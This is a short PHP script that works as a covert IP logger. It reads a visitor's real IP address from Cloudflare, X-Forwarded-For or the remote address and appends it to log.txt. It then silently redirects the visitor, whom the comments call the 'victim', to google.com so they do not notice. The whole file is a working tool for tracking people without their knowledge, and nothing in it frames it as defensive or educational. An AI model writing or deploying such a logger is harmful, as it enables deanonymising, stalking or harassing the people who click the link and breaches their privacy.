<?php
error_reporting(0);

// Function to get the most accurate IP
function get_victim_ip() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = get_victim_ip();

// Save to log.txt (LOCK_EX prevents file corruption)
if (!empty($ip)) {
    file_put_contents("log.txt", $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
}

// Redirect the victim so they don't see a blank page
header("Location: https://www.google.com");
exit();
?>
